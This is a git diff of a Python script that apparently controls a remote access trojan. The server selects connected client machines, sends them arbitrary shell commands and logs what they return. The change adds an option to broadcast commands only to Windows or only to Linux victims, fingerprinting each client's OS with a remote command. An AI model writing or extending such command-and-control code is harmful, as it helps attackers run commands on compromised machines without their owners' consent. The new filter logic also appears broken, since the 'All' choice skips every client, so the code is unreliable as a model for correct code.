@@ -122,7 +122,7 @@ if __name__ == "__main__":
         exit(0)
     signal.signal(signal.SIGINT, handle_sigint)
 
-    def interactive(sendall = False):
+    def interactive(sendall = False, operatingSystem = None):
         run = True
         runstatus = log.waitfor(f"Interactive mode | enter 'return' to quit | STATUS = ", status = "Commanding")
         while run:
@@ -134,8 +134,11 @@ if __name__ == "__main__":
                 if sendall:
                     for i in range(len(server.clients)):
                         server.select_client(i)
-                        output = server.send_command(command)
-                        log.info(output)
+                        if operatingSystem is None or server.send_command('python -c "import os; print(os.name)"') != operatingSystem:
+                            pass
+                        else:
+                            output = server.send_command(command)
+                            log.info(output)
                     log.info("Finished sending to all clients")
                 else:
                     output = server.send_command(command)
@@ -198,12 +201,17 @@ if __name__ == "__main__":
         elif choice == 3: #sendall
             if len(server.clients) > 0:
                 server.remove_dead()
-                interactive(True)
+                sendChoice = options("What System to Target?", ["All", "Windows", "Linux"])
+                if sendChoice == 0:
+                    interactive(True)
+                elif sendChoice == 1:
+                    interactive(True, "nt")
+                elif sendChoice == 2:
+                    interactive(True, "posix")
             else:
                 log.warning("No clients connected")
         else:
             server.stop()
-            #os.system("cls" if os.name == "nt" else "clear")
             ratrace = False
             splash()
             input("Press enter to continue...")
